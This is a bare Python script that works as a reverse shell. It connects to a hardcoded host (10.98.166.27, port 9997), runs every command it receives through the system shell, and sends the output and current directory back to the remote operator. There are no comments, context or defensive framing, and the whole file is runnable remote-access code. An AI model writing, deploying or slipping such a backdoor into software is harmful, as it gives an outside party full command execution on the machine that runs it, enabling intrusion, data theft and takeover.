import socket
import os
import subprocess

def sc_create():
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error:" + str(msg))


def sc_connect():
    try:
        host = '10.98.166.27'
        port = 9997
        s.connect((host, port))
        print("Connection established")
    except socket.error as msg:
        print("Socket connection error:" + str(msg))

def get_cmd():
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    s.close()

def main():
    sc_create()
    sc_connect()
    get_cmd()

main()